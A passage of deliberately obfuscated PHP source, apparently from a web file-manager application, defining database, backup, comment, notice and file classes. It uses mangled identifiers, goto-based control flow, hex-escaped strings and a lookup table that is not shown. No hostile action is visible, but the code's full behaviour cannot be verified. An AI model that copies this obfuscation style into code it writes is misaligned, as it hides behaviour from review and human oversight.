== $a҄[2436]) { $E = strtotime($bŢ[$a҄[186]]); } $bŢ[$a҄[186]] = $E; goto Eл; Eл: return parent::update($B, $bŢ); goto cњ; A𿪞: $a҄ =& $_SERVER[ԥ]; $F݅ݐ = $this->listData($B); if (!$F݅ݐ) { return !1; } goto Bۋ; cњ: } public function remove($A֫) { $eѰ = $this->listData($A֫); if (!$eѰ || $eѰ[$_SERVER[ԥ][1063]]) { return !1; } return parent::remove($A֫); } public function sort($fβ, $bе) { return parent::update($fβ, $bе); } public function enable($b, $EĲ) { return parent::update($b, array($_SERVER[ԥ][2437] => $EĲ)); } private function initUserOption() { $fՉ =& $_SERVER[ԥ]; $this->optionType = $fՉ[2438]; $this->modelType = $fՉ[2439]; $this->field = array($fՉ[2440], $fՉ[28], $fՉ[186], $fՉ[29], $fՉ[2441], $fՉ[673], $fՉ[179]); } public function userNoticeGet($eƵ = false) { $this->initUserOption(); return parent::listData($eƵ, $_SERVER[ԥ][363], !0); } public function userNoticeAdd($C) { $Až =& $_SERVER[ԥ]; $this->initUserOption(); $C̵ = $this->findByKey($Až[2440], $C[$Až[363]]); if ($C̵) { return !0; } $e۵ = array($Až[2440] => $C[$Až[363]], $Až[28] => $C[$Až[28]], $Až[186] => $C[$Až[186]], $Až[29] => isset($C[$Až[29]]) ? $C[$Až[29]] : 1, $Až[2441] => isset($C[$Až[2441]]) ? $C[$Až[2441]] : 0, $Až[673] => 0, $Až[179] => 0); return parent::insert($e۵); } public function userNoticeEdit($Dċ, $E) { $this->initUserOption(); return parent::update($Dċ, $E); } } goto A֭; F̠: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($a = '') { $b« =& $_SERVER[ԥ]; if (!class_exists($b«[811])) { think_exception(think_lang($b«[10]) . $b«[812]); } if (!empty($a)) { $this->config = $a; if (empty($this->config[$b«[13]])) { $this->config[$b«[13]] = array(); } } } public function connect($a񐧮 = '', $fջ = 0) { $F֚ =& $_SERVER[ԥ]; if (!isset($this->linkID[$fջ])) { goto A惼ȷ; A惼ȷ: if (empty($a񐧮)) { $a񐧮 = $this->config; } if ($this->pconnect) { $a񐧮[$F֚[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$fջ] = new PDO($a񐧮[$F֚[813]], $a񐧮[$F֚[786]], $a񐧮[$F֚[787]], $a񐧮[$F֚[13]]); } catch (PDOException $d֋) { think_exception($d֋->getMessage()); } goto E祵; bᤕ: $this->linkID[$fջ]->exec($F֚[822] . think_config($F֚[789])); $this->connected = !0; if (1 != think_config($F֚[18])) { unset($this->config); } goto E; E祵: $this->dbType = $this->_getDsnType($a񐧮[$F֚[813]]); if (in_array($this->dbType, array($F֚[814], $F֚[815], $F֚[816], $F֚[817]))) { think_exception($F֚[818] . $this->dbType . $F֚[819] . $this->dbType . $F֚[820]); } if (!$this->linkID[$fջ]) { think_exception($F֚[821]); } goto bᤕ; E: } return $this->linkID[$fջ]; } public function free() { $this->PDOStatement = null; } public function query($C߃, $bγ = array()) { goto A׈; A֘՟: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $CǑ = $this->PDOStatement->execute($bγ); $this->debug(); goto e; e: if (!1 === $CǑ) { $this->error(); return !1; } else { return $this->getAll(); } goto f; cȂ: $this->queryStr = $C߃; if (!empty($bγ)) { $this->queryStr .= $c՜۩[823] . print_r($bγ, !0) . $c՜۩[824]; } if (!empty($this->PDOStatement)) { $this->free(); } goto C; C: think_action_status($c՜۩[19], 1); think_status($c՜۩[20]); $this->PDOStatement = $this->_linkID->prepare($C߃); goto A֘՟; A׈: $c՜۩ =& $_SERVER[ԥ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cȂ; f: } public function execute($FՖ, $Fش = array()) { goto f۔ּ; f۔ּ: $Cٵ =& $_SERVER[ԥ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E㵎; Fދ: if ($this->dbType == $Cٵ[817]) { if (preg_match($Cٵ[825], $this->queryStr, $FԌͷ)) { $this->table = think_config($Cٵ[826]) . str_ireplace(think_config($Cٵ[827]), $Cٵ[357], $FԌͷ[2]); $cӇ = (bool) $this->query($Cٵ[828] . strtoupper($this->table) . $Cٵ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Cٵ[21], 1); goto fߏ; a: $fѠ = $this->PDOStatement->execute($Fش); $this->debug(); if (!1 === $fѠ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($cӇ || preg_match($Cٵ[829], $FՖ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Aڼ벉; E㵎: $this->queryStr = $FՖ; if (!empty($Fش)) { $this->queryStr .= $Cٵ[823] . print_r($Fش, !0) . $Cٵ[824]; } $cӇ = !1; goto Fދ; fߏ: think_status($Cٵ[20]); $this->PDOStatement = $this->_linkID->prepare($FՖ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto a; Aڼ벉: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D = $this->_linkID->commit(); $this->transTimes = 0; if (!$D) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $b͗ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$b͗) { $this->error(); return !1; } } return !0; } private function getAll() { $e = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($e); return $e; } public function getFields($b񳑈) { goto D䐔; D䐔: $Aֆ =& $_SERVER[ԥ]; $this->initConnect(!0); if (think_config($Aֆ[830])) { $A읾 = str_replace($Aֆ[831], $b񳑈, think_config($Aֆ[830])); } else { switch ($this->dbType) { case $Aֆ[814]: case $Aֆ[832]: $A읾 = "\123\x45\x4c\105\103\124\x20\40\x20\x63\157\154\165\x6d\156\137\156\x61\155\x65\40\x61\x73\x20\47\x4e\x61\155\145\x27\54\x20\x20\40\x64\141\x74\141\137\x74\171\160\145\40\141\163\40\47\124\171\x70\x65\47\x2c\40\40\x20\143\157\x6c\x75\x6d\x6e\137\144\x65\x66\x61\165\x6c\164\40\141\x73\x20\47\x44\145\146\x61\x75\x6c\164\47\x2c\40\x20\x20\x69\x73\x5f\156\x75\154\154\141\142\154\145\x20\141\x73\x20\47\x4e\x75\154\154\x27\xa\11\x9\x46\x52\117\115\11\151\156\146\157\x72\155\141\164\151\x6f\156\x5f\163\143\150\x65\x6d\141\x2e\164\x61\x62\x6c\145\163\40\x41\x53\x20\164\xa\11\x9\x4a\x4f\x49\116\11\x69\156\146\157\x72\x6d\141\x74\x69\x6f\x6e\137\163\x63\150\x65\155\141\56\x63\157\x6c\x75\x6d\156\x73\x20\x41\123\40\143\12\x9\x9\117\x4e\40\x20\x74\x2e\x74\x61\x62\154\145\x5f\143\141\x74\x61\154\x6f\x67\40\75\40\143\56\x74\141\x62\x6c\x65\137\x63\141\x74\141\x6c\x6f\147\xa\x9\x9\x41\116\x44\x20\x74\x2e\164\x61\142\x6c\x65\x5f\x73\143\x68\145\x6d\141\40\75\x20\x63\x2e\164\x61\142\x6c\x65\x5f\163\143\x68\x65\155\x61\xa\x9\11\x41\x4e\x44\40\164\56\x74\141\x62\x6c\145\137\156\x61\x6d\x65\x20\x3d\40\x63\56\164\141\142\x6c\x65\137\156\x61\x6d\145\xa\11\x9\x57\110\x45\122\105\x20\40\x20\x74\x2e\164\x61\142\154\145\137\x6e\x61\x6d\145\x20\x3d\x20\x27{$b񳑈}\47"; break; case $Aֆ[833]: $A읾 = $Aֆ[834] . $b񳑈 . $Aֆ[835]; break; case $Aֆ[815]: case $Aֆ[817]: $A읾 = $Aֆ[836] . $Aֆ[837] . $Aֆ[838] . strtoupper($b񳑈) . $Aֆ[839] . strtoupper($b񳑈) . $Aֆ[840]; break; case $Aֆ[841]: $A읾 = $Aֆ[842] . $b񳑈 . $Aֆ[843]; break; case $Aֆ[816]: break; case $Aֆ[844]: default: $A읾 = $Aֆ[845] . ($this->dbType == $Aֆ[844] ? "\140{$b񳑈}\140" : $b񳑈); } } goto cŠؘ; cŠؘ: $dȶ = $this->query($A읾); $Bۏ = array(); if ($dȶ) { foreach ($dȶ as $aܨ => $Có뿩) { $Có뿩 = array_change_key_case($Có뿩); $Có뿩[$Aֆ[28]] = isset($Có뿩[$Aֆ[28]]) ? $Có뿩[$Aֆ[28]] : $Aֆ[357]; $Có뿩[$Aֆ[29]] = isset($Có뿩[$Aֆ[29]]) ? $Có뿩[$Aֆ[29]] : $Aֆ[357]; $b۽ѭ = isset($Có뿩[$Aֆ[257]]) ? $Có뿩[$Aֆ[257]] : $Có뿩[$Aֆ[28]]; $Bۏ[$b۽ѭ] = array($Aֆ[28] => $b۽ѭ, $Aֆ[29] => $Có뿩[$Aֆ[29]], $Aֆ[31] => (bool) (isset($Có뿩[$Aֆ[99]]) && $Có뿩[$Aֆ[99]] === $Aֆ[33] || isset($Có뿩[$Aֆ[31]]) && $Có뿩[$Aֆ[31]] === $Aֆ[33]), $Aֆ[34] => isset($Có뿩[$Aֆ[34]]) ? $Có뿩[$Aֆ[34]] : (isset($Có뿩[$Aֆ[53]]) ? $Có뿩[$Aֆ[53]] : $Aֆ[357]), $Aֆ[36] => isset($Có뿩[$Aֆ[89]]) ? strtolower($Có뿩[$Aֆ[89]]) == $Aֆ[38] : (isset($Có뿩[$Aֆ[54]]) ? $Có뿩[$Aֆ[54]] : !1), $Aֆ[39] => isset($Có뿩[$Aֆ[846]]) ? strtolower($Có뿩[$Aֆ[846]]) == $Aֆ[41] : (isset($Có뿩[$Aֆ[89]]) ? $Có뿩[$Aֆ[89]] : !1)); } } goto eĉ; eĉ: return $Bۏ; goto f; f: } public function getTables($dֿ = '') { $Cޕ =& $_SERVER[ԥ]; if (think_config($Cޕ[847])) { $d繃 = str_replace($Cޕ[848], $dֿ, think_config($Cޕ[847])); } else { switch ($this->dbType) { case $Cޕ[815]: case $Cޕ[817]: $d繃 = $Cޕ[849]; break; case $Cޕ[814]: case $Cޕ[832]: $d繃 = $Cޕ[850]; break; case $Cޕ[841]: $d繃 = $Cޕ[851]; break; case $Cޕ[816]: think_exception(think_lang($Cޕ[852]) . $Cޕ[853]); break; case $Cޕ[833]: $d繃 = $Cޕ[42] . $Cޕ[43] . $Cޕ[44]; break; case $Cޕ[844]: default: if (!empty($dֿ)) { $d繃 = $Cޕ[797] . $dֿ; } else { $d繃 = $Cޕ[798]; } } } $eʡ = $this->query($d繃); $cΚ = array(); foreach ($eʡ as $Dލ폑 => $bǾͫ) { $cΚ[$Dލ폑] = current($bǾͫ); } return $cΚ; } protected function parseLimit($dܦ) { $aݾ =& $_SERVER[ԥ]; $E = $aݾ[33]; if (!empty($dܦ)) { switch ($this->dbType) { case $aݾ[841]: case $aݾ[833]: $dܦ = explode($aݾ[47], $dܦ); if (count($dܦ) > 1) { $E .= $aݾ[48] . $dܦ[1] . $aݾ[49] . $dܦ[0] . $aݾ[50]; } else { $E .= $aݾ[48] . $dܦ[0] . $aݾ[50]; } break; case $aݾ[814]: case $aݾ[832]: break; case $aݾ[816]: break; case $aݾ[815]: case $aݾ[817]: break; case $aݾ[844]: default: $E .= $aݾ[48] . $dܦ . $aݾ[50]; } } return $E; } public function parseKey(&$B㉋, $bʮ = true) { $CԔ =& $_SERVER[ԥ]; if ($bʮ) { $B㉋ = $this->parseKeyCheck($B㉋); } if ($this->dbType == $CԔ[844]) { if ($B㉋ != $CԔ[172] && !preg_match($CԔ[808], $B㉋)) { $B㉋ = $CԔ[809] . trim($B㉋, $CԔ[809]) . $CԔ[809]; } return $B㉋; } else { return parent::parseKey($B㉋); } } public function close() { $this->_linkID = null; } public function error() { $aгٮ =& $_SERVER[ԥ]; if ($this->PDOStatement) { $c = $this->PDOStatement->errorInfo(); $this->error = $c[1] . $aгٮ[4] . $c[2]; } else { $this->error = $aгٮ[33]; } if ($aгٮ[33] != $this->queryStr) { $this->error .= LNG($aгٮ[45]) . $this->queryStr; } think_trace($this->error, $aгٮ[33], $aгٮ[46]); return $this->error; } public function escapeString($dǇ) { $c =& $_SERVER[ԥ]; switch ($this->dbType) { case $c[841]: case $c[814]: case $c[832]: case $c[844]: return addslashes($dǇ); case $c[816]: case $c[833]: case $c[815]: case $c[817]: return str_ireplace($c[55], $c[56], $dǇ); } } protected function parseValue($Bȴ) { $F =& $_SERVER[ԥ]; if (is_string($Bȴ)) { $Bȴ = strpos($Bȴ, $F[4]) === 0 ? $this->escapeString($Bȴ) : $F[854] . $this->escapeString($Bȴ) . $F[854]; } elseif (isset($Bȴ[0]) && is_string($Bȴ[0]) && strtolower($Bȴ[0]) == $F[281]) { $Bȴ = $this->escapeString($Bȴ[1]); } elseif (is_array($Bȴ)) { $Bȴ = array_map(array($this, $F[855]), $Bȴ); } elseif (is_bool($Bȴ)) { $Bȴ = $Bȴ ? $F[83] : $F[464]; } elseif (is_null($Bȴ)) { $Bȴ = $F[99]; } return $Bȴ; } public function getLastInsertId() { $d鑖 =& $_SERVER[ԥ]; switch ($this->dbType) { case $d鑖[841]: case $d鑖[833]: case $d鑖[814]: case $d鑖[832]: case $d鑖[816]: case $d鑖[844]: return $this->_linkID->lastInsertId(); case $d鑖[815]: case $d鑖[817]: $d󦽐鉭 = $this->table; $b = $this->query("\x53\105\114\105\103\x54\40{$d󦽐鉭}\x2e\x63\x75\162\162\x76\x61\x6c\x20\143\x75\x72\162\166\141\x6c\x20\106\x52\x4f\115\x20\144\x75\x61\154"); return $b ? $b[0][$d鑖[856]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($b) { goto CւƜ; F: if (!$bχ) { return !1; } if (flock($bχ, LOCK_EX)) { $b = parent::query($b); flock($bχ, LOCK_UN); fclose($bχ); return $b; } flock($bχ, LOCK_UN); goto ē; CւƜ: $aİ =& $_SERVER[ԥ]; $Fᤍƈ = DATA_PATH . $aİ[857]; $bχ = fopen($Fᤍƈ, $aİ[858]); goto F; ē: fclose($bχ); show_json($aİ[859], !1); return !1; goto f텩; f텩: } public function execute($bŝ) { goto aḭ̂; CɌǵ: fclose($e); show_json($Dİ[859], !1); return !1; goto Aᚺݸˎ; Aщݧ: if (!$e) { return !1; } if (flock($e, LOCK_EX)) { $C畽 = parent::execute($bŝ); flock($e, LOCK_UN); fclose($e); return $C畽; } flock($e, LOCK_UN); goto CɌǵ; aḭ̂: $Dİ =& $_SERVER[ԥ]; $Fڱܜ = DATA_PATH . $Dİ[857]; $e = fopen($Fڱܜ, $Dİ[858]); goto Aщݧ; Aᚺݸˎ: } } class DbSqlite3 extends DbSqlite3Base { public function query($C嬕) { goto f՚; f՚: $aз =& $_SERVER[ԥ]; $BٰƊ = DATA_PATH . $aз[857]; $cӶ = fopen($BٰƊ, $aз[858]); goto Eݱă; Eݱă: if (!$cӶ) { return !1; } if (flock($cӶ, LOCK_EX)) { $Aք = parent::query($C嬕); flock($cӶ, LOCK_UN); fclose($cӶ); return $Aք; } flock($cӶ, LOCK_UN); goto D蠱; D蠱: fclose($cӶ); show_json($aз[859], !1); return !1; goto C݋; C݋: } public function execute($bҫޣ) { goto E; E: $c񝅽ؚ =& $_SERVER[ԥ]; $Bџ = DATA_PATH . $c񝅽ؚ[857]; $bن = fopen($Bџ, $c񝅽ؚ[858]); goto d癍罹; d癍罹: if (!$bن) { return !1; } if (flock($bن, LOCK_EX)) { $C݌͖ = parent::execute($bҫޣ); flock($bن, LOCK_UN); fclose($bن); return $C݌͖; } flock($bن, LOCK_UN); goto d; d: fclose($bن); show_json($c񝅽ؚ[859], !1); return !1; goto Dԓߌ; Dԓߌ: } } goto f쒪; AƎ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x62\141\x63\x6b\x75\x70\114\151\163\164"; public $field = array("\151\157", "\156\x61\155\145", "\163\164\141\x74\x75\x73", "\143\x6f\156\164\145\x6e\x74", "\x72\145\163\x75\154\164", "\x74\151\x6d\x65\106\162\x6f\155", "\x74\x69\x6d\145\x54\x6f"); public function config() { goto f; A: Action($e⍝[2088])->taskInit(); $F = Model($e⍝[2089])->listData(); foreach ($F as $C) { if ($C[$e⍝[1063]] == $e⍝[83] && $C[$e⍝[1392]] == $e⍝[2090]) { $d = $C; break; } } goto d헌; C⯎: $Eݙ؋ = is_array($Eݙ؋) ? $Eݙ؋ : array(); if (!isset($Eݙ؋[$e⍝[676]])) { $Eݙ؋[$e⍝[676]] = $e⍝[464]; } $d = array(); goto A; f: $e⍝ =& $_SERVER[ԥ]; $Eݙ؋ = Model($e⍝[1071])->get($e⍝[696]); $Eݙ؋ = json_decode($Eݙ؋, !0); goto C⯎; d헌: if (isset($d[$e⍝[186]])) { $d[$e⍝[186]] = json_decode($d[$e⍝[186]], !0); } if (isset($Eݙ؋[$e⍝[186]])) { $d[$e⍝[186]][$e⍝[1379]] = $Eݙ؋[$e⍝[186]]; unset($Eݙ؋[$e⍝[186]]); } return array_merge($d, $Eݙ؋); goto BЮ; BЮ: } public function listData($aÒ = false, $Dة = "\x6d\157\x64\151\146\x79\124\x69\x6d\x65", $Fѣ½ = false) { return parent::listData($aÒ, $Dة, !0); } public function lastItem() { $Bע㨲 = $this->listData(); return !empty($Bע㨲[0]) ? $Bע㨲[0] : null; } public function kill($AɅț) { goto b; F: $Fòλވ = $C[$b[28]]; $E = TEMP_FILES . $b[694] . $Fòλވ . $b[8]; IO::remove($E, !1); goto Cȕ; Cȕ: return $this->remove($AɅț); goto B; b: $b =& $_SERVER[ԥ]; $C = $this->listData($AɅț); if (!$C || empty($C[$b[28]])) { return !0; } goto e쥎; e쥎: Task::kill($b[695]); Task::kill($b[713]); Task::kill($b[728]); goto F; B: } public function remove($A) { $Bޥ = $this->listData($A); if (!$Bޥ) { return !0; } return $this->backupRemove($Bޥ); } private function backupRemove($Dق) { $BȫԺ =& $_SERVER[ԥ]; parent::remove($Dق[$BȫԺ[363]]); $a = "\x7b\151\x6f\x3a{$Dق[$BȫԺ[675]]}\x7d\57\144\x61\x74\141\142\141\x73\x65\57\142\141\143\153\165\x70\137" . $Dق[$BȫԺ[28]]; IO::remove($a, !1); return !0; } public function start() { goto EЌ߰; A꾐: if (!$b뒋υ->dbFile()) { return !1; } if ($dД[$A[676]] == $A[464]) { $b뒋υ->file(); } Backup::set(array($A[673] => 1, $A[687] => time())); goto A; bƎߊ: $b뒋υ = new Backup(); $b뒋υ->keep(); if (!$b뒋υ->db()) { return !1; } goto A꾐; EЌ߰: $A =& $_SERVER[ԥ]; if ($GLOBALS[$A[6]][$A[84]][$A[2091]] != $A[83]) { return !0; } $dД = $this->config(); goto A; A: if (!$dД || $dД[$A[1376]] != $A[83]) { return !1; } $B = $this->process(); foreach ($B as $bظԲ) { if ($bظԲ) { return Task::restart($bظԲ[$A[363]]); } } goto bƎߊ; A: return !0; goto cߎ; cߎ: } public function process() { $B̒ =& $_SERVER[ԥ]; return array($B̒[678] => Task::get($B̒[695]), $B̒[681] => Task::get($B̒[713]), $B̒[163] => Task::get($B̒[728])); } public function restore() { $bͰ =& $_SERVER[ԥ]; ActionCall($bͰ[2092], !0, 1); ActionCall($bͰ[2092], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\x65\x6e\x74"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\155\x65" => "\x63\x6f\x6d\155\145\156\164\137\x6d\x65\x74\x61", "\x6d\145\x74\x61\x46\151\x65\154\x64" => "\x63\x6f\x6d\155\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($a㓫) { $b̒搞 =& $_SERVER[ԥ]; if ($a㓫[$b̒搞[2093]]) { $cŃ = $this->where(array($b̒搞[2094] => $a㓫[$b̒搞[2093]]))->find(); if (!$cŃ || $cŃ[$b̒搞[367]] != $a㓫[$b̒搞[367]] || $cŃ[$b̒搞[452]] != $a㓫[$b̒搞[452]]) { return !1; } $this->where(array($b̒搞[2094] => $a㓫[$b̒搞[2093]]))->setAdd($b̒搞[2095], 1); } return $this->add($a㓫); } public function remove($aӆ) { $E =& $_SERVER[ԥ]; $Cڙϗ = array($E[2094] => $aӆ); $F = $this->where($Cڙϗ)->find(); if ($F[$E[2093]]) { $this->where(array($E[2094] => $F[$E[2093]]))->setAdd($E[2095], -1); } return $this->where($Cڙϗ)->delete(); } public function edit($E, $cԍי) { $C֍ٺ =& $_SERVER[ԥ]; $fǪ = array($C֍ٺ[2094] => $E); return $this->where($fǪ)->save(array($C֍ٺ[2096] => $cԍי)); } public function prasise($Cݱ) { $e =& $_SERVER[ԥ]; $C = Model($e[2097]); $a = array($e[2094] => $Cݱ, $e[1395] => USER_ID); $Dǧ = $C->where($a)->find(); if (!$Dǧ) { $C->add($a); $DÞ = $this->where(array($e[2094] => $Cݱ))->setAdd($e[2098], 1); } else { $C->where($a)->delete(); $DÞ = $this->where(array($e[2094] => $Cݱ))->setAdd($e[2098], -1); } return $DÞ; } public function targetInfo($b㶅, $A) { goto eȩ; AŶ: return $Bﯜ; goto bՊң; E: $f = "\x52\111\x47\110\124\x20\x4a\117\111\116\x20{$this->tablePrefix}\143\x6f\x6d\155\145\x6e\x74\x5f\160\162\141\151\163\x65\40\x73\x74\x61\162\40\x6f\156\40\x63\x6f\155\x6d\145\156\x74\56\143\x6f\x6d\155\x65\156\164\x49\x44\40\x3d\40\x73\x74\141\162\x2e\x63\x6f\x6d\x6d\145\156\x74\x49\x44"; $C = $this->alias($eǶ[337])->where($D)->join($f, $eǶ[2099])->count(); $Bﯜ = array($eǶ[2100] => $E̠, $eǶ[2101] => $C); goto AŶ; eȩ: $eǶ =& $_SERVER[ԥ]; $D = array($eǶ[517] => $b㶅, $eǶ[518] => $A); $E̠ = $this->where($D)->count(); goto E; bՊң: } public function listData($E񣳷) { $eॐ =& $_SERVER[ԥ]; if (isset($E񣳷[$eॐ[2102]])) { if ($E񣳷[$eॐ[2102]]) { $E񣳷[$eॐ[2103]] = array($eॐ[913], intval($E񣳷[$eॐ[2102]])); } unset($E񣳷[$eॐ[2102]]); } if (isset($E񣳷[$eॐ[2104]])) { if ($E񣳷[$eॐ[2104]]) { $E񣳷[$eॐ[2103]] = array($eॐ[910], intval($E񣳷[$eॐ[2104]])); } unset($E񣳷[$eॐ[2104]]); } return $this->_listData($E񣳷); } private function _listData($D˛Ƹ) { $D̯՝ =& $_SERVER[ԥ]; $bԳƹ = $this->where($D˛Ƹ)->_makeOrder()->selectPage(100); $this->_listAppendParent($bԳƹ[$D̯՝[350]]); $this->_listAppendUser($bԳƹ[$D̯՝[350]]); $this->_listAppendMeta($bԳƹ[$D̯՝[350]]); return $bԳƹ; } private function _makeOrder() { $d° =& $_SERVER[ԥ]; $d = array($d°[2098], $d°[2095], $d°[183]); $dݯ֕ = Input::get($d°[403], $d°[7], $d°[385], $d); $cᰧ = Input::get($d°[404], $d°[7], $d°[1397], array($d°[2105], $d°[401])); $eϫᶖ = $dݯ֕ . $d°[50] . $cᰧ; return $this->order($eϫᶖ); } private function _listAppendParent(&$Dɔ) { goto c; d󊝄: foreach ($Dɔ as &$dĦ) { if (isset($E򞫸[$dĦ[$D䰒[2093]]])) { $dĦ[$D䰒[2106]] = $E򞫸[$dĦ[$D䰒[2093]]]; } } goto D󦟿; c: $D䰒 =& $_SERVER[ԥ]; $cέ = array_unique(array_to_keyvalue($Dɔ, $D䰒[33], $D䰒[2093])); $cέ = array_remove_value($cέ, $D䰒[464]); goto F輛ٕ; F輛ٕ: if (!$cέ) { return; } $E򞫸 = $this->where(array($D䰒[2094] => array($D䰒[7], $cέ)))->select(); $E򞫸 = array_to_keyvalue($E򞫸, $D䰒[2103]); goto d󊝄; D󦟿: } private function _listAppendUser(&$e̾֨) { goto f쮨; f쮨: $D =& $_SERVER[ԥ]; $Fȟ = array_unique(array_to_keyvalue($e̾֨, $D[33], $D[1404])); $Fȟ = array_remove_value($Fȟ, $D[464]); goto cʇ; Cԏ⯷: foreach ($e̾֨ as &$f慚) { $f慚[$D[531]] = $CԴ[$f慚[$D[1404]]]; if (isset($f慚[$D[2106]])) { $f慚[$D[2106]][$D[531]] = $CԴ[$f慚[$D[2106]][$D[1404]]]; } } goto bލæ; cʇ: if (count($Fȟ) == 0) { return; } foreach ($e̾֨ as $f慚) { if (isset($f慚[$D[2106]])) { $Fȟ[] = $f慚[$D[2106]][$D[1404]]; } } $CԴ = Model($D[473])->userListInfo($Fȟ); goto Cԏ⯷; bލæ: } private function _listAppendMeta(&$B) { goto cң; aƼ: if (!$Bڕ) { return; } foreach ($B as $e֋͸) { if (isset($e֋͸[$a[2106]])) { $Bڕ[] = $e֋͸[$a[2106]][$a[2103]]; } } $Cǟ = $this->metaList($Bڕ); goto E𠎫; E𠎫: if (!$Cǟ) { return !1; } foreach ($B as &$e֋͸) { $e֋͸[$a[413]] = $Cǟ[$e֋͸[$a[2103]]]; if (isset($e֋͸[$a[2106]])) { $e֋͸[$a[2106]][$a[413]] = $Cǟ[$e֋͸[$a[2106]][$a[2103]]]; } } goto B; cң: $a =& $_SERVER[ԥ]; $Bڕ = array_unique(array_to_keyvalue($B, $a[33], $a[2103])); $Bڕ = array_remove_value($Bڕ, $a[464]); goto aƼ; B: } private function metaList($F) { goto A؇; D: $DԖ = Model($c[2107])->where($F˭)->select(); $DԖ = array_to_keyvalue_group($DԖ, $c[2103]); foreach ($DԖ as $CҌ => $d̤溠) { $e = array(); foreach ($d̤溠 as $Eƞ) { $e[$Eƞ[$c[89]]] = $Eƞ[$c[355]]; } $DԖ[$CҌ] = $e; } goto E; E: return $DԖ ? $DԖ : array(); goto fݎ; A؇: $c =& $_SERVER[ԥ]; if (!$F) { return array(); } $F˭ = array($c[2103] => array($c[7], $F)); goto D; fݎ: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\154\145"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\x6d\145" => "\151\157\137\146\x69\x6c\x65\137\x6d\x65\164\x61", "\155\145\x74\141\x46\x69\x65\x6c\x64" => "\146\x69\154\x65\x49\104"); public function fileInfo($eλ) { $B =& $_SERVER[ԥ]; static $D򆦭 = array(); if (!isset($D򆦭[$eλ])) { $AᎫ = $B[2108]; $bԥ = Model($B[418])->field($AᎫ)->where(array($B[416] => $eλ))->find(); $D򆦭[$eλ] = $bԥ; } return $D򆦭[$eλ]; } public function addFileByContent($fߞϡ = '', $bʝ = '') { goto E͵; Dɉ尻: $fǖ = $c . $fԜ[2110] . rand_string(16); file_put_contents($fǖ, $fߞϡ); $bҔ = $this->addFile($fǖ, $bʝ, !0); goto c; c: if (file_exists($fǖ)) { @unlink($fǖ); } return $bҔ; goto fә; E͵: $fԜ =& $_SERVER[ԥ]; $c = TEMP_PATH . $fԜ[2109]; if (!is_dir($c)) { mk_dir($c); } goto Dɉ尻; fә: } public function createFileName($F򂞆) { goto e΢; e΢: $Eİϊ =& $_SERVER[ԥ]; $Cُ = IO::init($Eİϊ[8]); $a½ = $this->makeFilePath($F򂞆, $Cُ); goto e; e: $b쫄 = $Cُ->pathFather($a½); static $EΕ = false; $BŖυ = $Eİϊ[2111] . md5($b쫄); goto C뽩; C뽩: if (!$EΕ && !Cache::get($BŖυ)) { $EΕ = !0; $Cϖ = IO::mkdir($b쫄); if (!IO::exist($Cϖ . $Eİϊ[2112])) { IO::mkfile($Cϖ . $Eİϊ[2112]); } Cache::set($BŖυ, 1, 3600 * 2); } return $a½; goto a»; a»: } public function makeFilePath($D߰ʾ, $aڝ) { goto b犾; A: $C = $b . rand_string(5) . short_id(100); $D߰ʾ = str_replace($Dͫ[8], $Dͫ[70], KodIO::clear($D߰ʾ)); if (!$D߰ʾ) { $aȸ = $Dͫ[2115]; } goto E۫; E۫: switch ($aȸ) { case $Dͫ[2116]: $C = $C . $Dͫ[91] . $aڝ->ext($D߰ʾ); if ($aڝ->ext($D߰ʾ) == $Dͫ[2056]) { $C .= $Dͫ[2117]; } break; case $Dͫ[2118]: goto eڐܪ; eڐܪ: $d⋵ = Model($Dͫ[1071])->get($Dͫ[1305]); $B휽 = substr(md5($Dͫ[1876] . $d⋵ . date($Dͫ[671])), 0, 8); $b = KodIO::defaultIO() . date($Dͫ[2119]) . $B휽 . $Dͫ[8]; goto b; b: if ($aڝ->ext($D߰ʾ) == $Dͫ[2056]) { $D߰ʾ .= $Dͫ[2117]; } $f˦ = IO::fileNameAuto($b, $D߰ʾ); $C = $b . $f˦; goto dƻ; dƻ: break; goto a; a: case $Dͫ[2115]: break; default: break; } return $C; goto b; b犾: $Dͫ =& $_SERVER[ԥ]; $aȸ = Model($Dͫ[1071])->get($Dͫ[2113]); $b = KodIO::defaultIO() . date($Dͫ[2114]); goto A; b: } public function addFileByRemote($c, $eؼ, $A딸Đ = array()) { goto bș֭; Cն: if ($Fį = $this->addFileCheckExist($Cɤ[$Bä[160]], $Cɤ[$Bä[159]], $Cɤ[$Bä[77]])) { return $Fį; } return $this->addFileData($Cɤ); goto bƖג; bș֭: $Bä =& $_SERVER[ԥ]; if (!IO::exist($c)) { return !1; } $F¯֋ = $A딸Đ[$Bä[159]] ? $A딸Đ[$Bä[159]] : $Bä[33]; goto aέ; aέ: $Cĝ = IO::hashMd5($c, $F¯֋); $B = KodIO::defaultDriver(); $Cɤ = array($Bä[516] => IO::size($c), $Bä[2120] => 1, $Bä[382] => $eؼ, $Bä[727] => $B[$Bä[363]], $Bä[383] => $c, $Bä[2121] => 